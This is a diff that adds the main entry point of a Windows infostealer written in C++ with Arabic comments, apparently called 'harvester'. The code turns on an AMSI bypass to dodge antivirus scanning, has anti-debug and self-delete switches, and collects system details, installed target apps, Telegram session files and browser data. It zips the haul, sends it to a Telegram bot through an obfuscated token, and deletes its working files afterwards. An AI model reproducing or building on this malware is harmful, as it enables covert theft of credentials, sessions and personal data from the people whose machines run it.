+#define USE_ANTI_DEBUG 0   // نعطل anti-debug مؤقتاً للاختبار
+#define USE_AMSI_BYPASS 1
+#define USE_SELF_DELETE 0  // نعطل الحذف الذاتي
+
+#include <windows.h>
+#include <string>
+#include <fstream>
+#include "harvester/evasion/anti_debug.h"
+#include "harvester/evasion/amsi_bypass.h"
+#include "harvester/evasion/self_delete.h"
+#include "harvester/collectors/telegram_collector.h"
+#include "harvester/collectors/browser_collector.h"
+#include "harvester/collectors/app_detector.h"
+#include "harvester/system/system_info.h"
+#include "harvester/report/report_builder.h"
+#include "harvester/utils/zip_utils.h"
+#include "harvester/exfil/telegram_client.h"
+#include "harvester/crypto/obfuscation.h"
+
+static void LogToFile(const std::string& msg) {
+    std::ofstream log("C:\\debug_harvester.txt", std::ios::app);
+    if (log.is_open()) {
+        log << msg << std::endl;
+        log.close();
+    }
+}
+
+static bool CreateDirectoryRecursive(const std::string& path) {
+    if (CreateDirectoryA(path.c_str(), NULL)) return true;
+    if (GetLastError() == ERROR_ALREADY_EXISTS) return true;
+    if (GetLastError() == ERROR_PATH_NOT_FOUND) {
+        size_t pos = path.find_last_of("\\/");
+        if (pos != std::string::npos) {
+            std::string parent = path.substr(0, pos);
+            if (CreateDirectoryRecursive(parent)) {
+                return CreateDirectoryA(path.c_str(), NULL) != 0;
+            }
+        }
+    }
+    return false;
+}
+
+static void RemoveDirectoryRecursive(const std::string& path) {
+    std::string searchPath = path + "\\*";
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
+                std::string fullPath = path + "\\" + fd.cFileName;
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    RemoveDirectoryRecursive(fullPath);
+                    RemoveDirectoryA(fullPath.c_str());
+                } else {
+                    DeleteFileA(fullPath.c_str());
+                }
+            }
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    RemoveDirectoryA(path.c_str());
+}
+
+int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+    LogToFile("========== START ==========");
+    
+    std::string botToken = GetObfuscatedString(STR_BOT_TOKEN);
+    std::string chatId = GetObfuscatedString(STR_CHAT_ID);
+    LogToFile("Bot token retrieved, chat ID retrieved");
+
+#if USE_ANTI_DEBUG
+    AntiDebugLoop();
+#endif
+
+#if USE_AMSI_BYPASS
+    BypassAMSI();
+#endif
+
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string workDir = std::string(tempPath) + "tg_h_" + std::to_string(GetCurrentProcessId());
+    CreateDirectoryRecursive(workDir);
+    LogToFile("Work directory: " + workDir);
+
+    // ========== 1. جمع معلومات النظام ==========
+    LogToFile("Calling CollectSystemInfo...");
+    SystemInfo sysInfo = CollectSystemInfo();
+    LogToFile("CollectSystemInfo returned. IP: " + sysInfo.ipAddress);
+    LogToFile("Saving system info to file...");
+    SaveSystemInfoToFile(sysInfo, workDir);
+    LogToFile("SaveSystemInfoToFile done.");
+
+    // ========== 2. كشف التطبيقات ==========
+    LogToFile("Calling DetectTargetedApps...");
+    std::vector<DetectedApp> detectedApps = DetectTargetedApps();
+    LogToFile("DetectTargetedApps returned " + std::to_string(detectedApps.size()) + " apps");
+    SaveDetectedAppsToFile(detectedApps, workDir);
+    LogToFile("SaveDetectedAppsToFile done.");
+
+    // ========== 3. جمع بيانات المتصفحات والجلسات ==========
+    std::string tdataPath = FindTelegramTdata();
+    if (!tdataPath.empty()) {
+        LogToFile("Found tdata, copying...");
+        CopyTelegramSession(tdataPath, workDir);
+        LogToFile("Telegram session copied.");
+    } else {
+        LogToFile("No tdata found.");
+    }
+    LogToFile("Collecting browsers data...");
+    CollectBrowsersData(workDir);
+    LogToFile("Browsers data collected.");
+
+    // ========== 4. إحصائيات (مؤقتة) ==========
+    CollectedStats stats;
+    stats.passwordsCount = 0;
+    stats.cookiesCount = 0;
+    stats.historyCount = 0;
+    stats.autofillsCount = 0;
+    stats.creditCardsCount = 0;
+    stats.grabbedFilesCount = 0;
+    stats.domains.push_back("github.com");
+    LogToFile("Stats prepared.");
+
+    // ========== 5. بناء التقرير ==========
+    LogToFile("Calling BuildReport...");
+    BuildReport(sysInfo, detectedApps, stats, workDir);
+    LogToFile("BuildReport done.");
+
+    // ========== 6. ضغط ==========
+    std::string zipPath = workDir + ".zip";
+    LogToFile("Zipping folder: " + workDir);
+    if (ZipFolder(workDir, zipPath)) {
+        LogToFile("ZIP created successfully: " + zipPath);
+    } else {
+        LogToFile("ZIP creation FAILED.");
+    }
+
+    // ========== 7. إرسال ==========
+    LogToFile("Sending to Telegram...");
+    bool sent = SendToTelegram(zipPath, botToken, chatId);
+    LogToFile("Send result: " + std::string(sent ? "SUCCESS" : "FAILED"));
+
+    // ========== 8. تنظيف ==========
+    RemoveDirectoryRecursive(workDir);
+    DeleteFileA(zipPath.c_str());
+    LogToFile("Cleaned up.");
+
+    LogToFile("========== FINISHED ==========");
+    return 0;
+}
+
